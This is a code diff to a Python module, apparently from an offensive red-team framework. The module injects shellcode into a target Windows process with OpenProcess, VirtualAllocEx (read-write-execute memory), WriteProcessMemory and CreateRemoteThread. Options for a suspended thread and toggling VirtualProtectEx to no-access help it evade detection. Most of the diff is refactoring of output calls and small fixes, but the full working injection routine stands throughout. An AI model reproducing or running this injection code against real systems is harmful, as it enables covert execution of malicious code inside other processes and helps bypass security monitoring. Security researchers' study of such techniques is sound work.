@@ -7,6 +7,7 @@
 ########################################################
 
 import os
+from time import sleep
 from utils.windef import *
 from utils.winconst import *
 from utils.style import *
@@ -15,7 +16,8 @@ from utils.helper import CheckFile
 CATEGORY    = 'inject'
 DESCRIPTION = 'Inject shellcode into memory with CreateRemoteThread'
 
-cs = ConsoleStyles()
+css = ConsoleStyles()
+cs_print = css.console_print()
 
 arglist = {
     'input':           { 'value': None, 'desc': 'Input file or buffer for process injection' },
@@ -42,7 +44,7 @@ class module:
     import threading
 
     Author = 'cpu0x00, psycore8'
-    Version = '0.9.0'
+    Version = '1.0.1'
     DisplayName = 'INJECTION'
     delay = 5
     data_size = 0
@@ -51,7 +53,7 @@ class module:
     relay = False
     shell_path = '::inject::injection'
 
-    def __init__(self, input, process, start_process, shellcode=None, resume_thread=None, virtual_protect=None):
+    def __init__(self, input, process, start_process, shellcode:bytes, resume_thread=None, virtual_protect=None):
         self.input = input
         self.process_start = start_process
         self.target_process = process
@@ -60,61 +62,64 @@ class module:
         self.virtual_protect = virtual_protect
 
     def Start_Process(self):
-        cs.console_print.note(f'Starting {self.target_process}')
+        cs_print.note(f'Starting {self.target_process}') # type: ignore
+        ### os.system
         os.system(self.target_process)
 
     def get_proc_id(self):
         processes = self.wmi.WMI().Win32_Process(name=self.target_process)
         self.pid = processes[0].ProcessId
-        cs.console_print.note(f'{self.target_process} process id: {self.pid}')
+        cs_print.note(f'{self.target_process} process id: {self.pid}') # type: ignore
         return int(self.pid)
 
     def start_injection(self):
         if self.process_start:
             s = self.threading.Thread(target=self.Start_Process)
             s.start()
-            self.sleep(3)
+            sleep(3)
 
         process_id = self.get_proc_id()
         
         phandle = OpenProcess(PROCESS_ALL_ACCESS, False, process_id)
         if phandle:
-            cs.console_print.note('Process handle opened')
+            cs_print.note('Process handle opened') # type: ignore
 
+        ### self.shellcode definition
         memory = VirtualAllocEx(phandle, None, len(self.shellcode), MEM_COMMIT_RESERVE, PAGE_READWRITE_EXECUTE)
         if memory:
-            cs.console_print.note('Process memory allocated')
+            cs_print.note('Process memory allocated') # type: ignore
 
+        ### self.shellcode definition
         writing = WriteProcessMemory(phandle, memory, self.shellcode, len(self.shellcode), 0)
         if writing:
-            cs.console_print.note('Shellcode written to memory')
+            cs_print.note('Shellcode written to memory') # type: ignore
         if self.virtual_protect:
-            cs.console_print.note('VirtualProtectEx: PAGE_NO_ACCESS')
+            cs_print.note('VirtualProtectEx: PAGE_NO_ACCESS') # type: ignore
             VirtualProtectEx(phandle, None, 0, 0x01, None)
 
         if self.resume_thread or self.virtual_protect:
-            cs.console_print.note('CreateRemoteThread: START_SUSPENDED')
+            cs_print.note('CreateRemoteThread: START_SUSPENDED') # type: ignore
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, 0x00000004, None)
         else:
             Injection = CreateRemoteThread(phandle, None, 0, memory, None, EXECUTE_IMMEDIATLY, None)
 
         if Injection:
-            cs.console_print.ok('Shellcode injected!')
+            cs_print.ok('Shellcode injected!') # type: ignore
 
         if self.virtual_protect:
-            cs.console_print.note('VirtualProtectEx: PAGE_READWRITE_EXECUTE')
+            cs_print.note('VirtualProtectEx: PAGE_READWRITE_EXECUTE') # type: ignore
             VirtualProtectEx(phandle, None, 0, 0x40, None)
 
         if self.resume_thread or self.virtual_protect:
-            self.sleep(self.delay)
-            cs.console_print.note('ResumeThread')
+            sleep(self.delay)
+            cs_print.note('ResumeThread') # type: ignore
             resume = ResumeThread(Injection)
             if resume:
-                cs.console_print.ok('Process resumed')
+                cs_print.ok('Process resumed') # type: ignore
 
         CloseHandle(phandle)
 
-    def proc_inject():
+    def proc_inject(self):
         return False
     
     def open_file(self):
@@ -125,17 +130,18 @@ class module:
             return False
     
     def process(self):
-        cs.module_header(self.DisplayName, self.Version)
+        css.module_header(self.DisplayName, self.Version)
         if isinstance(self.input, str):
-            cs.console_print.note('Try to open file')
+            cs_print.note('Try to open file') # type: ignore
             CheckFile(self.input)
-            cs.action_open_file2(self.input)
+            css.action_open_file2(self.input)
             self.open_file()
-            cs.console_print.note('Try to execute shellcode')
+            cs_print.note('Try to execute shellcode') # type: ignore
             self.start_injection()
         elif isinstance(self.input, bytes):
             self.shellcode = self.input
             self.start_injection()
         else:
-            cs.console_print.error(f'File {self.input} not found or cannot be opened.')
-        cs.console_print.ok('DONE!')
+            self.shellcode = b''
+            cs_print.error(f'File {self.input} not found or cannot be opened.') # type: ignore
+        cs_print.ok('DONE!') # type: ignore
